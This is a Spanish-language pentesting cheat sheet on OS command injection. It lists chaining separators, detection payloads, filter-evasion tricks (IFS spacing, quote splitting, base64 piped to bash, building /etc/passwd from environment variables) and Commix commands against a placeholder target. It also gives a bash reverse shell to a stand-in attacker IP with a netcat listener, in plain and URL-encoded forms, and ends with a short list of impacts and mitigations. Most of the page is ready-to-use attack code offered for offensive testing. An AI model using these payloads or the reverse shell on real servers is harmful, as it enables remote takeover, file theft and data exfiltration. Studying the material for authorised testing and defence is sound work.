# 💉 Command Injection

La inyección de comandos ocurre cuando una aplicación web pasa datos controlados por el usuario a una función del sistema operativo sin sanitizarlos correctamente. El atacante puede ejecutar comandos arbitrarios en el servidor con los privilegios del proceso web.

Es una de las vulnerabilidades más críticas, ya que su explotación exitosa equivale a tener acceso directo al servidor.

---

## Detección

Los caracteres que permiten encadenar comandos en bash/cmd son los primeros vectores a probar:

| Separador | Comportamiento | Sistemas |
|---|---|---|
| `;` | Ejecuta el segundo comando independientemente | Linux/macOS |
| `&&` | Ejecuta el segundo solo si el primero tuvo éxito | Linux/macOS/Windows |
| `\|\|` | Ejecuta el segundo solo si el primero falló | Linux/macOS/Windows |
| `\|` | Pasa la salida del primero al segundo | Linux/macOS/Windows |
| `` `comando` `` | Sustitución de comandos (backticks) | Linux/macOS |
| `$(comando)` | Sustitución de comandos | Linux/macOS |
| `&` | Ejecuta en segundo plano / en paralelo | Linux/Windows |
| `\n` / `%0a` | Salto de línea como separador | Linux |

### Payloads básicos de detección

```
# Concatenados al valor original del parámetro vulnerable
; whoami
& whoami
| whoami
$(whoami)
`whoami`
; id ; hostname
%0a id
```

---

## Técnicas de evasión de filtros

Si la aplicación bloquea caracteres o palabras clave concretas, existen múltiples técnicas para evitarlo:

### Espacios

```bash
# Variable $IFS (Internal Field Separator)
cat$IFS/etc/passwd

# Llaves de bash
{cat,/etc/passwd}

# Tabulación URL-encoded
cat%09/etc/passwd

# Redirección como separador
cat</etc/passwd
```

### Palabras clave bloqueadas (ej. `cat`, `whoami`, `ls`)

```bash
# Comillas dentro del comando (bash las ignora)
w"h"o"a"m"i"
'w'h'o'a'm'i'
c"a"t /etc/passwd

# Variable vacía dentro de la palabra
w$()hoami
who$@ami

# Encoding en bash
# Primero encontrar el ASCII decimal: echo -n 'whoami' | od -A n -t x1 | tr -d ' '
echo -n 'cat /etc/passwd' | base64   # Y luego:
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)

# Invertir la cadena
rev <<< 'imaohw'   # Resultado: whoami
$(rev<<<'imaohw')

# Variables del entorno que contengan letras útiles
# $PATH, $HOME, $SHELL...
echo ${PATH:0:1}   # '/'
echo ${HOME:0:1}   # '/'
```

### Barras y puntos bloqueados

```bash
# Usar variables de entorno para construir rutas
echo ${PATH:0:1}   # /
${PATH:0:1}etc${PATH:0:1}passwd   # /etc/passwd

# Mediante corte de cadenas del entorno
cat ${HOME:0:1}etc${HOME:0:1}passwd
```

### Evasión en Windows (cmd y PowerShell)

```cmd
# Comillas dentro del comando (cmd las ignora)
who^ami
w"h"o"a"m"i"

# Variables de entorno
%COMSPEC:~0,1%   → 'C'
%PROGRAMFILES:~10,5%   → ' ' (espacio)
```

---

## Herramientas de automatización

### Commix

Herramienta específica para detectar y explotar command injection automáticamente:

```bash
# Detección básica
commix --url "http://target.com/page?param=value"

# Con cookies de sesión
commix --url "http://target.com/page?param=value" --cookie="PHPSESSID=abc123"

# Forzar modo ciego (time-based)
commix --url "http://target.com/page?param=value" --technique=time
```

### Con Burp Suite

Interceptar la petición → enviar al Intruder o Repeater → probar manualmente los separadores y payloads de evasión listados arriba.

---

## Obtener shell desde command injection

Una vez confirmada la ejecución de comandos, el objetivo habitual es obtener una reverse shell:

```bash
# Listener en la máquina del atacante
nc -nlvp 443

# Payload (URL-encoded si va en GET)
bash -c 'bash -i >& /dev/tcp/<IP_ATACANTE>/443 0>&1'

# URL-encoded
bash+-c+'bash+-i+>%26+/dev/tcp/<IP_ATACANTE>/443+0>%261'
```

---

## Impacto potencial

- Ejecución de comandos arbitrarios en el servidor
- Lectura de archivos sensibles (`/etc/passwd`, claves SSH, configuraciones)
- Instalación de backdoors o reverse shells
- Pivoting hacia otros sistemas de la red interna
- Exfiltración de datos

---

## Mitigaciones

- **Nunca pasar input del usuario directamente a funciones del sistema** (`system()`, `exec()`, `popen()`, etc.)
- Usar APIs nativas del lenguaje en lugar de llamadas al shell cuando sea posible
- Validación estricta con lista blanca de caracteres permitidos
- Ejecutar el proceso web con el mínimo de privilegios necesarios
- Sandboxing (contenedores, chroot, AppArmor/SELinux)
